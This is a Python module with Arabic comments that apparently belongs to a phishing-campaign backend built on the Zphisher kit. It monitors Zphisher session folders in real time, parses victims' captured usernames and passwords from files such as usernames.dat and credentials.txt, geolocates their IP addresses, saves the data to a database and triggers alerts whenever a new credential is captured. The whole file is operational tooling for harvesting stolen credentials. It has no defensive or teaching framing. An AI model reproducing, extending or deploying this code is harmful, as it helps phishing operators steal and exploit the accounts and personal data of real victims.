"""
📁 نظام مراقبة الملفات والبيانات في الوقت الفعلي
يراقب ملفات Zphisher ويعالج البيانات المُلتقطة فورياً
"""

import asyncio
import logging
import json
import time
from pathlib import Path
from typing import Dict, List, Any, Optional, Callable
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from datetime import datetime
import aiofiles
import re

from ..database import db_manager
from ..config import settings
from .analytics import geoip_analyzer

logger = logging.getLogger(__name__)

class ZphisherFileHandler(FileSystemEventHandler):
    """معالج أحداث ملفات Zphisher"""
    
    def __init__(self, monitor):
        self.monitor = monitor
        super().__init__()
    
    def on_modified(self, event):
        """عند تعديل ملف"""
        if not event.is_directory:
            asyncio.create_task(self.monitor.handle_file_change(event.src_path))
    
    def on_created(self, event):
        """عند إنشاء ملف جديد"""
        if not event.is_directory:
            asyncio.create_task(self.monitor.handle_file_change(event.src_path))

class DataFileMonitor:
    """مراقب ملفات البيانات المتقدم"""
    
    def __init__(self):
        self.observers = {}
        self.active_sessions = {}
        self.callbacks = {
            'new_capture': [],
            'new_visit': [], 
            'session_update': []
        }
        self.last_processed = {}
        
    async def start_monitoring_session(self, session_id: str, session_path: Path):
        """بدء مراقبة جلسة محددة"""
        
        if session_id in self.observers:
            await self.stop_monitoring_session(session_id)
        
        try:
            # إنشاء مراقب الملفات
            observer = Observer()
            handler = ZphisherFileHandler(self)
            
            # مراقبة مجلد الجلسة
            observer.schedule(handler, str(session_path), recursive=True)
            observer.start()
            
            self.observers[session_id] = observer
            self.active_sessions[session_id] = {
                'path': session_path,
                'started_at': datetime.utcnow(),
                'last_activity': datetime.utcnow()
            }
            
            # مراقبة الملفات الموجودة
            await self._scan_existing_files(session_id, session_path)
            
            logger.info(f"بدأت مراقبة الجلسة: {session_id}")
            
        except Exception as e:
            logger.error(f"خطأ في بدء مراقبة الجلسة {session_id}: {e}")
    
    async def stop_monitoring_session(self, session_id: str):
        """إيقاف مراقبة جلسة"""
        
        if session_id in self.observers:
            try:
                self.observers[session_id].stop()
                self.observers[session_id].join()
                del self.observers[session_id]
                
                if session_id in self.active_sessions:
                    del self.active_sessions[session_id]
                
                logger.info(f"تم إيقاف مراقبة الجلسة: {session_id}")
                
            except Exception as e:
                logger.error(f"خطأ في إيقاف مراقبة الجلسة {session_id}: {e}")
    
    async def handle_file_change(self, file_path: str):
        """معالجة تغيير في ملف"""
        
        file_path = Path(file_path)
        filename = file_path.name
        
        try:
            # تحديد نوع الملف ومعالجته
            if filename in ['usernames.dat', 'ip.txt', 'credentials.txt']:
                await self._process_credentials_file(file_path)
            elif filename == 'visits.json':
                await self._process_visits_file(file_path)
            elif filename == 'captured_data.json':
                await self._process_captured_data_file(file_path)
            elif filename.endswith('.log'):
                await self._process_log_file(file_path)
                
        except Exception as e:
            logger.error(f"خطأ في معالجة الملف {file_path}: {e}")
    
    async def _scan_existing_files(self, session_id: str, session_path: Path):
        """فحص الملفات الموجودة عند بدء المراقبة"""
        
        data_files = [
            'usernames.dat',
            'ip.txt', 
            'credentials.txt',
            'visits.json',
            'captured_data.json'
        ]
        
        for filename in data_files:
            file_path = session_path / filename
            if file_path.exists():
                await self.handle_file_change(str(file_path))
    
    async def _process_credentials_file(self, file_path: Path):
        """معالجة ملفات بيانات الاعتماد"""
        
        try:
            # الحصول على معرف الجلسة من المسار
            session_id = self._extract_session_id(file_path)
            if not session_id:
                return
            
            # قراءة الملف
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                content = await f.read()
            
            if not content.strip():
                return
            
            # تحليل البيانات حسب نوع الملف
            if file_path.name == 'usernames.dat':
                await self._parse_usernames_file(session_id, content)
            elif file_path.name == 'ip.txt':
                await self._parse_ip_file(session_id, content)
            elif file_path.name == 'credentials.txt':
                await self._parse_credentials_file(session_id, content)
                
        except Exception as e:
            logger.error(f"خطأ في معالجة ملف البيانات {file_path}: {e}")
    
    async def _parse_usernames_file(self, session_id: str, content: str):
        """تحليل ملف أسماء المستخدمين"""
        
        lines = content.strip().split('\n')
        new_entries = []
        
        for line in lines:
            line = line.strip()
            if line and line not in self.last_processed.get(f"{session_id}_usernames", set()):
                
                # تحليل البيانات
                parts = line.split(' | ')
                if len(parts) >= 2:
                    timestamp_str = parts[0]
                    credentials = parts[1]
                    
                    # استخراج اسم المستخدم وكلمة المرور
                    username, password = self._extract_credentials(credentials)
                    
                    if username and password:
                        capture_data = {
                            'session_id': session_id,
                            'username': username,
                            'password': password,
                            'captured_at': self._parse_timestamp(timestamp_str),
                            'source_file': 'usernames.dat'
                        }
                        
                        new_entries.append(capture_data)
        
        # حفظ البيانات الجديدة
        if new_entries:
            await self._save_captured_data(new_entries)
            
            # تحديث آخر معالجة
            if f"{session_id}_usernames" not in self.last_processed:
                self.last_processed[f"{session_id}_usernames"] = set()
            
            for entry in new_entries:
                self.last_processed[f"{session_id}_usernames"].add(
                    f"{entry['captured_at']} | {entry['username']}:{entry['password']}"
                )
    
    async def _parse_ip_file(self, session_id: str, content: str):
        """تحليل ملف عناوين IP"""
        
        lines = content.strip().split('\n')
        new_ips = []
        
        for line in lines:
            line = line.strip()
            if line and line not in self.last_processed.get(f"{session_id}_ips", set()):
                
                # تحليل IP مع الوقت
                parts = line.split(' | ')
                if len(parts) >= 2:
                    timestamp_str = parts[0]
                    ip_address = parts[1]
                    
                    # تحليل جغرافي للـ IP
                    geo_data = await geoip_analyzer.analyze_ip_address(ip_address)
                    
                    ip_data = {
                        'session_id': session_id,
                        'ip_address': ip_address,
                        'visited_at': self._parse_timestamp(timestamp_str),
                        'geo_data': geo_data,
                        'source_file': 'ip.txt'
                    }
                    
                    new_ips.append(ip_data)
        
        # حفظ بيانات الزيارات
        if new_ips:
            await self._save_visit_data(new_ips)
            
            # تحديث آخر معالجة
            if f"{session_id}_ips" not in self.last_processed:
                self.last_processed[f"{session_id}_ips"] = set()
            
            for ip_data in new_ips:
                self.last_processed[f"{session_id}_ips"].add(
                    f"{ip_data['visited_at']} | {ip_data['ip_address']}"
                )
    
    async def _parse_credentials_file(self, session_id: str, content: str):
        """تحليل ملف بيانات الاعتماد الشامل"""
        
        lines = content.strip().split('\n')
        new_credentials = []
        
        for line in lines:
            line = line.strip()
            if line and line not in self.last_processed.get(f"{session_id}_creds", set()):
                
                # تحليل البيانات المتقدمة
                data = self._parse_advanced_credentials(line)
                if data:
                    data['session_id'] = session_id
                    data['source_file'] = 'credentials.txt'
                    new_credentials.append(data)
        
        # حفظ البيانات الجديدة
        if new_credentials:
            await self._save_captured_data(new_credentials)
            
            # تحديث آخر معالجة
            if f"{session_id}_creds" not in self.last_processed:
                self.last_processed[f"{session_id}_creds"] = set()
            
            for cred in new_credentials:
                self.last_processed[f"{session_id}_creds"].add(line)
    
    async def _process_visits_file(self, file_path: Path):
        """معالجة ملف الزيارات JSON"""
        
        try:
            session_id = self._extract_session_id(file_path)
            if not session_id:
                return
            
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                content = await f.read()
            
            if not content.strip():
                return
            
            # تحليل JSON
            visits_data = json.loads(content)
            
            # معالجة كل زيارة
            for visit in visits_data.get('visits', []):
                await self._process_visit_entry(session_id, visit)
                
        except json.JSONDecodeError:
            logger.warning(f"ملف JSON غير صحيح: {file_path}")
        except Exception as e:
            logger.error(f"خطأ في معالجة ملف الزيارات {file_path}: {e}")
    
    async def _process_captured_data_file(self, file_path: Path):
        """معالجة ملف البيانات المُلتقطة JSON"""
        
        try:
            session_id = self._extract_session_id(file_path)
            if not session_id:
                return
            
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                content = await f.read()
            
            if not content.strip():
                return
            
            # تحليل JSON
            captured_data = json.loads(content)
            
            # معالجة البيانات المُلتقطة
            for entry in captured_data.get('captures', []):
                await self._process_capture_entry(session_id, entry)
                
        except json.JSONDecodeError:
            logger.warning(f"ملف JSON غير صحيح: {file_path}")
        except Exception as e:
            logger.error(f"خطأ في معالجة ملف البيانات {file_path}: {e}")
    
    async def _process_log_file(self, file_path: Path):
        """معالجة ملفات السجل"""
        
        try:
            session_id = self._extract_session_id(file_path)
            if not session_id:
                return
            
            # قراءة آخر سطور من ملف السجل
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                lines = await f.readlines()
            
            # معالجة السطور الجديدة فقط
            last_position = self.last_processed.get(f"{session_id}_log", 0)
            new_lines = lines[last_position:]
            
            for line in new_lines:
                await self._analyze_log_entry(session_id, line.strip())
            
            # تحديث الموضع
            self.last_processed[f"{session_id}_log"] = len(lines)
            
        except Exception as e:
            logger.error(f"خطأ في معالجة ملف السجل {file_path}: {e}")
    
    def _extract_session_id(self, file_path: Path) -> Optional[str]:
        """استخراج معرف الجلسة من مسار الملف"""
        
        # البحث عن معرف الجلسة في المسار
        for part in file_path.parts:
            if part.startswith('session_'):
                return part
        
        # البحث في أسماء الملفات النشطة
        for session_id, session_info in self.active_sessions.items():
            if str(session_info['path']) in str(file_path):
                return session_id
        
        return None
    
    def _extract_credentials(self, credentials_line: str) -> tuple:
        """استخراج اسم المستخدم وكلمة المرور"""
        
        # أنماط مختلفة لاستخراج البيانات
        patterns = [
            r'Username:\s*(.+?)\s*Password:\s*(.+)',
            r'Email:\s*(.+?)\s*Password:\s*(.+)',
            r'(.+?):(.+)',
            r'(.+?)\s*\|\s*(.+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, credentials_line, re.IGNORECASE)
            if match:
                return match.group(1).strip(), match.group(2).strip()
        
        return None, None
    
    def _parse_timestamp(self, timestamp_str: str) -> datetime:
        """تحليل الطابع الزمني"""
        
        try:
            # أنماط مختلفة للوقت
            formats = [
                '%Y-%m-%d %H:%M:%S',
                '%d/%m/%Y %H:%M:%S',
                '%Y-%m-%d_%H-%M-%S',
                '%d-%m-%Y_%H:%M:%S'
            ]
            
            for fmt in formats:
                try:
                    return datetime.strptime(timestamp_str, fmt)
                except ValueError:
                    continue
                    
            # إذا فشل كل شيء، استخدم الوقت الحالي
            return datetime.utcnow()
            
        except Exception:
            return datetime.utcnow()
    
    def _parse_advanced_credentials(self, line: str) -> Optional[Dict[str, Any]]:
        """تحليل بيانات الاعتماد المتقدمة"""
        
        try:
            # تحليل JSON إذا كان موجود
            if line.startswith('{') and line.endswith('}'):
                return json.loads(line)
            
            # تحليل النص العادي
            parts = line.split(' | ')
            if len(parts) >= 3:
                timestamp = self._parse_timestamp(parts[0])
                username, password = self._extract_credentials(parts[1])
                
                data = {
                    'captured_at': timestamp,
                    'username': username,
                    'password': password,
                    'user_agent': parts[2] if len(parts) > 2 else None,
                    'ip_address': parts[3] if len(parts) > 3 else None
                }
                
                return data
            
        except Exception as e:
            logger.warning(f"فشل في تحليل البيانات: {line[:50]}... - {e}")
        
        return None
    
    async def _save_captured_data(self, data_entries: List[Dict[str, Any]]):
        """حفظ البيانات المُلتقطة في قاعدة البيانات"""
        
        for entry in data_entries:
            try:
                captured_record = await db_manager.create_captured_data(
                    session_id=entry['session_id'],
                    username=entry.get('username'),
                    password=entry.get('password'),
                    ip_address=entry.get('ip_address'),
                    user_agent=entry.get('user_agent'),
                    additional_data=entry.get('additional_data', {})
                )
                
                # إعداد البيانات للإشعارات
                notification_data = {
                    'id': captured_record.id if captured_record else None,
                    'session_id': entry['session_id'],
                    'username': entry.get('username', 'غير محدد'),
                    'country': entry.get('geo_data', {}).get('country', 'غير محدد'),
                    'device_info': entry.get('device_type', 'غير محدد')
                }
                
                # استدعاء callbacks
                await self._trigger_callbacks('new_capture', notification_data)
                
            except Exception as e:
                logger.error(f"خطأ في حفظ البيانات المُلتقطة: {e}")
    
    async def _save_visit_data(self, visit_entries: List[Dict[str, Any]]):
        """حفظ بيانات الزيارات"""
        
        for entry in visit_entries:
            try:
                # تحديث إحصائيات الجلسة
                await db_manager.increment_session_visitors(entry['session_id'])
                
                # استدعاء callbacks
                await self._trigger_callbacks('new_visit', entry)
                
            except Exception as e:
                logger.error(f"خطأ في حفظ بيانات الزيارة: {e}")
    
    async def _process_visit_entry(self, session_id: str, visit_data: Dict[str, Any]):
        """معالجة إدخال زيارة"""
        
        try:
            # تحليل بيانات الزيارة
            ip_address = visit_data.get('ip')
            user_agent = visit_data.get('user_agent')
            
            if ip_address:
                # تحليل جغرافي
                geo_data = await geoip_analyzer.analyze_ip_address(ip_address)
                
                visit_entry = {
                    'session_id': session_id,
                    'ip_address': ip_address,
                    'user_agent': user_agent,
                    'visited_at': datetime.utcnow(),
                    'geo_data': geo_data
                }
                
                await self._save_visit_data([visit_entry])
                
        except Exception as e:
            logger.error(f"خطأ في معالجة الزيارة: {e}")
    
    async def _process_capture_entry(self, session_id: str, capture_data: Dict[str, Any]):
        """معالجة إدخال بيانات مُلتقطة"""
        
        try:
            entry = {
                'session_id': session_id,
                'username': capture_data.get('username'),
                'password': capture_data.get('password'),
                'ip_address': capture_data.get('ip'),
                'user_agent': capture_data.get('user_agent'),
                'captured_at': datetime.utcnow(),
                'additional_data': capture_data
            }
            
            await self._save_captured_data([entry])
            
        except Exception as e:
            logger.error(f"خطأ في معالجة البيانات المُلتقطة: {e}")
    
    async def _analyze_log_entry(self, session_id: str, log_line: str):
        """تحليل إدخال السجل"""
        
        try:
            # البحث عن أنماط مهمة في السجل
            if 'ERROR' in log_line.upper():
                await self._handle_error_log(session_id, log_line)
            elif 'NEW CONNECTION' in log_line.upper():
                await self._handle_connection_log(session_id, log_line)
            elif 'DATA CAPTURED' in log_line.upper():
                await self._handle_capture_log(session_id, log_line)
                
        except Exception as e:
            logger.error(f"خطأ في تحليل السجل: {e}")
    
    async def _handle_error_log(self, session_id: str, log_line: str):
        """معالجة أخطاء السجل"""
        
        await db_manager.log_system_event(
            event_type='session_error',
            description=f"خطأ في الجلسة {session_id}: {log_line}",
            session_id=session_id
        )
    
    async def _handle_connection_log(self, session_id: str, log_line: str):
        """معالجة اتصالات جديدة"""
        
        # استخراج IP من السجل
        ip_match = re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', log_line)
        if ip_match:
            ip_address = ip_match.group()
            await self._save_visit_data([{
                'session_id': session_id,
                'ip_address': ip_address,
                'visited_at': datetime.utcnow(),
                'source': 'log_analysis'
            }])
    
    async def _handle_capture_log(self, session_id: str, log_line: str):
        """معالجة التقاط البيانات من السجل"""
        
        # تحديث عداد البيانات المُلتقطة
        await db_manager.increment_session_credentials(session_id)
    
    def add_callback(self, event_type: str, callback: Callable):
        """إضافة دالة استدعاء للأحداث"""
        
        if event_type in self.callbacks:
            self.callbacks[event_type].append(callback)
    
    async def _trigger_callbacks(self, event_type: str, data: Dict[str, Any]):
        """تشغيل دوال الاستدعاء"""
        
        for callback in self.callbacks.get(event_type, []):
            try:
                if asyncio.iscoroutinefunction(callback):
                    await callback(data)
                else:
                    callback(data)
            except Exception as e:
                logger.error(f"خطأ في callback {event_type}: {e}")
    
    async def get_session_stats(self, session_id: str) -> Dict[str, Any]:
        """الحصول على إحصائيات الجلسة المباشرة"""
        
        if session_id not in self.active_sessions:
            return {}
        
        session_info = self.active_sessions[session_id]
        
        return {
            'session_id': session_id,
            'monitoring_duration': (datetime.utcnow() - session_info['started_at']).total_seconds(),
            'last_activity': session_info['last_activity'],
            'files_monitored': len([f for f in session_info['path'].iterdir() if f.is_file()]),
            'status': 'active'
        }
    
    async def cleanup(self):
        """تنظيف وإغلاق جميع المراقبات"""
        
        for session_id in list(self.observers.keys()):
            await self.stop_monitoring_session(session_id)
        
        logger.info("تم تنظيف جميع مراقبات الملفات")

# مثيل عام
file_monitor = DataFileMonitor()